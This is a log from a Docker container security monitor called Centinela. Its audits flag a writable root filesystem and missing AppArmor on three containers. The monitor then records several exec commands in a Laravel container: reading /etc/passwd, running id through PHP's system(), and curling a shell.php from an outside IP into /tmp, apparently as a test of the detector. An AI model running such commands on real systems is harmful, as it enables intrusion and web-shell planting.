2026-03-26T11:31:32 | [32mINFO    [0m | centinela | Logging initialised -> D:\proyectos\programasivan\Centinela\Centinela\logs
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | CENTINELA starting up – logging initialised.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Docker client connected successfully.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Incident repository initialised.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Alert manager initialised.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Project registry loaded – 5 project(s) tracked.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Monitor cross-wiring complete.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.filesystem | Filesystem watchdog Observer started (early).
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Running startup audit on all currently running containers...
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: running security audit for container tuya_laravel_app (project: tuya-laravel)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=1 project=tuya-laravel container=tuya_laravel_app type=SECURITY_AUDIT severity=low rule='Container root filesystem is writable'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=1 project=tuya-laravel
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=2 project=tuya-laravel container=tuya_laravel_app type=SECURITY_AUDIT severity=medium rule='AppArmor profile not applied to container'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=2 project=tuya-laravel
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: registering filesystem watchers for container tuya_laravel_app (project: tuya-laravel)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.filesystem | Adding FS watcher for new container: tuya_laravel_app
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: running security audit for container tuya_postgres (project: tuya-postgres)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=3 project=tuya-postgres container=tuya_postgres type=SECURITY_AUDIT severity=low rule='Container root filesystem is writable'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=3 project=tuya-postgres
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=4 project=tuya-postgres container=tuya_postgres type=SECURITY_AUDIT severity=medium rule='AppArmor profile not applied to container'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=4 project=tuya-postgres
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: registering filesystem watchers for container tuya_postgres (project: tuya-postgres)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.filesystem | Adding FS watcher for new container: tuya_postgres
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: running security audit for container tuya_redis (project: tuya-redis)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=5 project=tuya-redis container=tuya_redis type=SECURITY_AUDIT severity=low rule='Container root filesystem is writable'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=5 project=tuya-redis
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=6 project=tuya-redis container=tuya_redis type=SECURITY_AUDIT severity=medium rule='AppArmor profile not applied to container'
2026-03-26T11:31:32 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=6 project=tuya-redis
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup: registering filesystem watchers for container tuya_redis (project: tuya-redis)
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.filesystem | Adding FS watcher for new container: tuya_redis
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Startup audit complete (3 containers inspected).
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | All monitors started. CENTINELA is watching 5 project(s).
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.docker_events | DockerEventMonitor starting.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.docker_events | DockerEventMonitor: event stream started.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.process_monitor | ProcessMonitor starting.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.network | NetworkMonitor started (interval=15s, host_root=).
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.filesystem | Filesystem watchdog Observer already running.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | SecurityAuditMonitor started (interval=30s).
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.main | Web dashboard starting on port 8080
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:31:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:31:33 | [32mINFO    [0m | centinela.monitors.filesystem | Periodic FS hash check loop started (interval=60s).
2026-03-26T11:32:01 | [33mWARNING [0m | centinela.monitors.docker_events | DOCKER EXEC detected: container=tuya_laravel_app exec_id=fec2e9443885 cmd='bash -c id && hostname && cat /etc/passwd | head -3' project=tuya-laravel
2026-03-26T11:32:01 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=7 project=tuya-laravel container=tuya_laravel_app type=DOCKER_EVENT_EXEC severity=high rule='exec_in_container:bash'
2026-03-26T11:32:01 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=7 project=tuya-laravel
2026-03-26T11:32:01 | [32mINFO    [0m | centinela.monitors.process_monitor | ProcessMonitor: running immediate check on tuya_laravel_app
2026-03-26T11:32:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:32:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:32:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:32:05 | [33mWARNING [0m | centinela.monitors.docker_events | DOCKER EXEC detected: container=tuya_laravel_app exec_id=23128a8ab6a6 cmd="bash -c curl -s --max-time 3 http://93.184.216.34/ -o /dev/null && echo 'conectado a example.com'" project=tuya-laravel
2026-03-26T11:32:05 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=8 project=tuya-laravel container=tuya_laravel_app type=DOCKER_EVENT_EXEC severity=high rule='exec_in_container:bash'
2026-03-26T11:32:05 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=8 project=tuya-laravel
2026-03-26T11:32:05 | [32mINFO    [0m | centinela.monitors.process_monitor | ProcessMonitor: running immediate check on tuya_laravel_app
2026-03-26T11:32:05 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4577 user=root pattern='bash' cmd="bash -c curl -s --max-time 3 http://93.184.216.34/ -o /dev/null && echo 'conectado a example.com'" project=tuya-laravel
2026-03-26T11:32:06 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=9 project=tuya-laravel container=tuya_laravel_app type=PROCESS_SUSPICIOUS severity=medium rule='suspicious_process:bash'
2026-03-26T11:32:06 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=9 project=tuya-laravel
2026-03-26T11:32:06 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4583 user=root pattern='curl' cmd='curl -s --max-time 3 http://93.184.216.34/ -o /dev/null' project=tuya-laravel
2026-03-26T11:32:06 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=10 project=tuya-laravel container=tuya_laravel_app type=PROCESS_SUSPICIOUS severity=medium rule='suspicious_process:curl'
2026-03-26T11:32:06 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=10 project=tuya-laravel
2026-03-26T11:32:09 | [33mWARNING [0m | centinela.monitors.docker_events | DOCKER EXEC detected: container=tuya_laravel_app exec_id=7c795f095ed8 cmd='bash -c php -r \'system("id");\'' project=tuya-laravel
2026-03-26T11:32:09 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=11 project=tuya-laravel container=tuya_laravel_app type=DOCKER_EVENT_EXEC severity=high rule='exec_in_container:bash'
2026-03-26T11:32:09 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=11 project=tuya-laravel
2026-03-26T11:32:09 | [32mINFO    [0m | centinela.monitors.process_monitor | ProcessMonitor: running immediate check on tuya_laravel_app
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.monitors.docker_events | DOCKER EXEC detected: container=tuya_laravel_app exec_id=f108c0efad5e cmd='bash -c curl -s --max-time 3 http://45.33.32.156/shell.php -o /tmp/x || true' project=tuya-laravel
2026-03-26T11:32:13 | [32mINFO    [0m | centinela.alerts.manager | INCIDENT SAVED id=12 project=tuya-laravel container=tuya_laravel_app type=DOCKER_EVENT_EXEC severity=high rule='exec_in_container:bash'
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.alerts.manager | No alert channels configured for incident id=12 project=tuya-laravel
2026-03-26T11:32:13 | [32mINFO    [0m | centinela.monitors.process_monitor | ProcessMonitor: running immediate check on tuya_laravel_app
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4644 user=root pattern='bash' cmd='bash -c curl -s --max-time 3 http://45.33.32.156/shell.php -o /tmp/x || true' project=tuya-laravel
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4656 user=root pattern='curl' cmd='curl -s --max-time 3 http://45.33.32.156/shell.php -o /tmp/x' project=tuya-laravel
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4644 user=root pattern='bash' cmd='bash -c curl -s --max-time 3 http://45.33.32.156/shell.php -o /tmp/x || true' project=tuya-laravel
2026-03-26T11:32:13 | [33mWARNING [0m | centinela.monitors.process_monitor | Suspicious process: container=tuya_laravel_app pid=4656 user=root pattern='curl' cmd='curl -s --max-time 3 http://45.33.32.156/shell.php -o /tmp/x' project=tuya-laravel
2026-03-26T11:32:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:32:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:32:32 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:33:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:33:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:33:02 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:33:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:33:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:33:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:34:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:34:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:34:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:34:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:34:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:34:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:35:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:35:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:35:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:35:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:35:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:35:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:36:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:36:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:36:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:36:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:36:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:36:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:37:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:37:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:37:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:37:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:37:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:37:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:38:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:38:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:38:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:38:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:38:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:38:33 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:39:03 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:39:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:39:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:39:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:39:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:39:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:40:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:40:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:40:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:40:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:40:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:40:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:41:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:41:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:41:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:41:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:41:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:41:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:42:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:42:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:42:04 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
2026-03-26T11:42:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_laravel_app.
2026-03-26T11:42:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_postgres.
2026-03-26T11:42:34 | [32mINFO    [0m | centinela.monitors.security_audit | Security audit found 2 finding(s) for container tuya_redis.
